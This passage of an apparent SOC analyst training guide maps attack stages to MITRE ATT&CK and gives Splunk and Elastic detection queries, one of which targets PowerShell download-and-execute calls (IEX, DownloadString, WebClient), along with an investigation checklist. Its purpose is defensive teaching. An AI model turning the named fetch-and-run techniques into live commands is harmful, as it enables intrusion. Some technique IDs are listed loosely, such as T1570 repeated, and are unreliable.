   → Forced authentication attacks (NetNTLM relay)

8. DISCOVERY (T1087, T1538)
   → Enumerate user accounts
   → Map network infrastructure
   → Identify high-value targets

9. LATERAL MOVEMENT (T1570, T1570)
   → Use stolen credentials
   → Deploy tools via RDP and PSExec
   → Move to domain controllers

10. COLLECTION (T1005, T1123)
    → Collect documents and emails
    → Screen capture and recording
    → Audio capture from meetings

11. COMMAND AND CONTROL (T1571, T1008)
    → Custom encrypted protocols
    → Multiple C2 channels for redundancy
    → Fallback communication methods

12. EXFILTRATION (T1041, T1030)
    → Exfil data over C2 channels
    → Chunk data to avoid detection
    → Compress sensitive files before transfer
```

---

## Tools Integration for SOC Analysts

### Splunk MITRE ATT&CK Integration

```
SPLUNK QUERY EXAMPLE: Detect T1059.001 (PowerShell)

index=windows EventCode=4688
| search CommandLine="*IEX*" OR CommandLine="*Invoke-Expression*"
| search CommandLine="*DownloadString*" OR CommandLine="*WebClient*"
| table TimeGenerated, User, Computer, CommandLine, ParentImage
| search NOT User=*admin* User=*service*
```

### Elastic Stack Mapping

```
Elasticsearch Index: security-events-*

Query: Detect T1547.001 (Registry Run Key)
{
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "registry.path": "*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*"
          }
        },
        {
          "match": {
            "event.action": "modification"
          }
        }
      ]
    }
  }
}
```

### Threat Intelligence Mapping

```
INDICATOR TYPE     | TOOL              | MITRE MAPPING
-------------------|-------------------|----------------------------------
Domain             | URLScan.io        | C2 infrastructure (T1071)
                   | VirusTotal        | Malware indicators
                   | Whois lookup      | Domain registration analysis

IP Address         | AbuseIPDB         | Known C2 servers
                   | Shodan            | Open ports, services
                   | MaxMind GeoIP     | Geographic anomalies

File Hash          | VirusTotal        | Malware signatures
                   | YARA rules        | Custom detection rules
                   | ANY.RUN           | Behavioral analysis

Email Phishing     | PhishTool         | Phishing email indicators
                   | urlscan.io        | Link analysis
                   | MXToolbox         | Email authentication checks
```

---

## Key Takeaways for SOC L1 Analysts

### Critical Defense Principles

1. **Know the Kill Chain**: Every attack follows MITRE ATT&CK tactics
2. **Detect Early**: Catch adversaries at reconnaissance/initial access stages
3. **Hunt for Lateral Movement**: Early detection prevents escalation
4. **Monitor Credentials**: Credential access leads to privilege escalation
5. **Watch Persistence**: Persistence mechanisms indicate long-term compromise

### Alert Investigation Checklist

```
When you receive ANY security alert:

[ ] Identify MITRE ATT&CK Tactic
[ ] Map to specific Technique(s)
[ ] Check for preceding tactics (reconnaissance → initial access?)
[ ] Look for related events in past 24-48 hours
[ ] Check threat intelligence (IP, domain, hash, file)
[ ] Analyze process parent-child relationships
[ ] Review user context (admin? after hours? location?)
[ ] Check for lateral movement indicators
[ ] Determine if incident or false positive
[ ] Escalate to Tier 2 if HIGH severity
[ ] Document findings and actions taken
```

### Common SOC L1 Blind Spots

1. **Ignoring Process Trees**: Parent-child processes reveal attack patterns
2. **Not Checking Persistence**: Attackers maintain access for weeks
3. **Skipping Threat Intel**: IP/domain intelligence prevents escalation
4. **Missing Lateral Movement**: Attackers move before data theft
5. **Assuming Isolated**: One alert often leads to more compromised systems

---

## Conclusion

MITRE ATT&CK provides the standardized framework for understanding adversary behavior. As an SOC L1 analyst, your job is to:

1. **Identify** which tactic/technique is occurring
2. **Investigate** the alert with proper methodology
3. **Escalate** appropriately based on severity
4. **Document** findings for threat intelligence
5. **Learn** from incidents to improve detection

Every alert maps to one or more tactics. Understanding the full attack chain helps you detect compromise early and respond effectively.

**Remember**: Attackers follow patterns. Your job is to recognize those patterns and stop them before damage occurs.

---

## References & Further Reading

- MITRE ATT&CK Framework: https://attack.mitre.org
- ATT&CK for Enterprise: https://attack.mitre.org/tactics/enterprise/
- Threat Reports (map tactics): https://attack.mitre.org/groups/
- SOC metrics (MTTD, MTTR): Monitor your team's effectiveness
- TryHackMe SOC Workbooks: Practice identifying tactics in real scenarios
